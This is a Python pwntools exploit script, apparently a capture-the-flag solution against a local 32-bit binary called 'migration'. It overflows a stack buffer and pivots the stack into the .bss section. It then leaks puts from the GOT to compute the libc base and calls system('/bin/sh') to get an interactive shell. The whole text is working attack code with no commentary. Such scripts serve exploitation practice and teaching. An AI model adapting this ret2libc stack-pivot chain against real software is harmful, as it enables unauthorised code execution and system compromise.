#!/usr/bin/env python
from pwn import *
# context.log_level = 'debug'
context.arch = 'i386'
p = process('./migration')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
puts_offset = libc.symbols['puts']
system_offset = libc.symbols['system']
elf = ELF('./migration')
read_plt = elf.plt['read']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
g = lambda x: next(elf.search(asm(x)))
leave_ret = g('leave ; ret')
pop_ebx_ret = g('pop ebx ; ret')
pop_esi_edi_ebp_ret = g('pop esi ; pop edi ; pop ebp ; ret')
buf1 = elf.bss(0x500)
buf2 = elf.bss(0x400)
# gdb.attach(p)
offset = 0x28
info('>>> MIGRATE THE STACK <<<')
payload = flat([
	cyclic(offset), 
	buf1, # ebp
	read_plt, 
	leave_ret, 
	0, buf1, 0x100
])
print repr(payload)
p.sendafter('Try your best :\n', payload)
info('>>> LEAK libc ADDRESS <<<')
payload = flat([
	buf2, 
	puts_plt, 
	pop_ebx_ret, 
	puts_got, 
	read_plt, 
	leave_ret, 
	0, buf2, 0x100
])
print repr(payload)
p.send(payload)
puts = u32(p.recv(4))
libc_base = puts - puts_offset
success('libc_base = ' + hex(libc_base))
system = libc_base + system_offset
success('system = ' + hex(system))
info('>>> GET THE shell <<<')
payload = flat([
	buf1, 
	read_plt, 
	pop_esi_edi_ebp_ret, 
	0, buf1, 0x100, 
	system, 
	0xdeadbeef, 
	buf1
])
print repr(payload)
p.send(payload)
p.send('/bin/sh\x00')
p.interactive()
